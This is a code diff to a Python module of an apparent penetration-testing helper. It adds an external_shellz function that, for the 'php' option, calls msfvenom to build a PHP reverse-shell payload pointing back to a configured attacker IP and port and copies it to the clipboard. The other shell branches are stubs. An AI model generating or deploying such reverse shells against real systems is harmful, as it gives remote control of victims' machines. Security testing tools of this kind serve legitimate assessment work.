@@ -1,11 +1,38 @@
 from . import commons
 import sys,os,re,json
+import clipboard
 
 from ..miscellaneous.config import Config,bcolors
 from .module import switcher_module
 
-def external_shellz():
-    return
+shellz_notes = ["Spawn TTY shell https://netsec.ws/?p=337"]
+
+def external_shellz(cmd=None,state=None):
+	out = ""
+	if cmd[0] == "linux_x86":
+		clipboard.copy(out)
+		print("{}* linux_x86 copied to clipboard{}".format(bcolors.WARNING,bcolors.ENDC))
+		return
+	elif cmd[0] == "windows_x86":
+		clipboard.copy(out)
+		print("{}* windows_x86 copied to clipboard{}".format(bcolors.WARNING,bcolors.ENDC))
+		return
+	elif cmd[0] == "php":
+		out = os.popen("msfvenom -p php/reverse_php LHOST="+Config.HOSTIP+" LPORT="+Config.SHELLPORT+" -f raw").read()
+	elif cmd[0] == "asp":
+		return
+	elif cmd[0] == "jsp":
+		return
+	elif cmd[0] == "notes":
+		for note in shellz_notes:
+			print("{}[*] {}{}".format(bcolors.OKBLUE,note,bcolors.ENDC))
+		return
+	else:
+		print("{}Invalid option!{}".format(bcolors.WARNING,bcolors.ENDC))
+		return
+	clipboard.copy(out)
+	print("{}* Shell {} copied to clipboard{}".format(bcolors.WARNING,cmd[0],bcolors.ENDC))
+	return
 
 def external_use(cmd=None,state=None):
 	if len(cmd)==2:
